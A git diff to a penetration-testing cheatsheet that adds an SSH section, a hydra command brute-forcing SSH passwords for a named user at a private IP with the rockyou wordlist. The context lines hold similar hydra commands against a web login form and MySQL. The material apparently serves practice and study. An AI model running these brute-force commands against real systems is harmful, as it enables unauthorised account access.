@@ -59,6 +59,7 @@ This cheatsheet is definitely not "complete". I am sure i forgot to write down h
     + [HTTP Get Request](#http-get-request)
     + [HTTP Post Request](#http-post-request)
     + [MYSQL](#mysql)
+    + [SSH](#ssh)
 - [File Transfer](#file-transfer)
   * [Powershell](#powershell)
     + [As Cmd.exe Command](#as-cmdexe-command)
@@ -367,6 +368,10 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/
 hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://192.168.0.1:3306/MYDATABASENAME -t 15
 ```
 
+### SSH
+```bash
+hydra -l daisa -P /usr/share/wordlists/rockyou.txt 192.168.130.76 ssh
+```
 ***
 
 # File Transfer
